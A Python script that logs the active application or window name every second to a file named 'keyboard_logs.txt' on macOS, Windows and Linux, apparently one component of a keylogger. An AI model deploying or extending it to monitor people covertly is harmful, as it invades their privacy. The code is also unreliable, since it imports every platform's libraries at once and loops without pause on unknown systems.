#!/usr/local/bin/python3
import platform
from Xlib import X, display 
import pygetwindow as gw 
from AppKit import NSWorkspace 
import time 

#Get the operating system information 
def get_os():
    os = platform.system()
    if os == 'Darwin':
        return 'macOS'
    elif os == 'Linux':
        return 'Linux'
    elif os == 'Windows':
        return 'Windows'
    else: 
        return 'Unknown'

#Identify the macOs operating system 
def identify_macos():
    #Get the shared workspace 
    workspace = NSWorkspace.sharedWorkspace()
    #Get the active application information 
    active_app=workspace.frontmostApplication()
    #Extract application name and other details 
    app_name = active_app.localizedName()
    bundle_id = active_app.bundleIdentifier()
    return app_name, bundle_id 

#Identify the windows operating system 
def identify_windows():
    active_window = gw.getActiveWindow()
    return active_window 

#Identify the linux operating system 
def identify_linux():
    #connect to the X server 
    d = display.Display()
    root = d.screen().root
    #get the atom for active window 
    _NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
    NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
    UTF8_STRING = d.intern_atom('UTF8_STRING')
    #get the active window
    active_window = root.get_full_property(_NET_ACTIVE_WINDOW, X.AnyPropertyType).value[0]
    window = d.create_resource_object('window', active_window)
    #get the window name 
    window_name = window.get_full_property(NET_WM_NAME, UTF8_STRING)
    if window_name:
        return window_name.value.decode('utf-8')
    else:
        return 'No active window name found'

def active_window():
    while True:
        checker = get_os()
        if checker == 'macOS':
            app_name, bundle_id = identify_macos()
            with open('keyboard_logs.txt', 'a') as file:
                file.write(f'Application Name: {app_name}\n')
                file.write(f'Bundle Identifier: {bundle_id}\n')
                file.flush()
            time.sleep(1)
        elif checker == 'Windows':
            active_window = identify_windows()
            with open('keyboard_logs.txt', 'a') as file:
                file.write(f'Active Window: {active_window}\n')
                file.flush()
            time.sleep(1)
        elif checker == 'Linux':
             active_window = identify_linux()
             with open('keyboard_logs.txt', 'a') as file:
                file.write(f'Active Window: {active_window}\n')
                file.flush()
             time.sleep(1)
        else:
            with open('keyboard_logs.txt', 'a') as file:
                file.write('Unknown operating system\n')
active_window()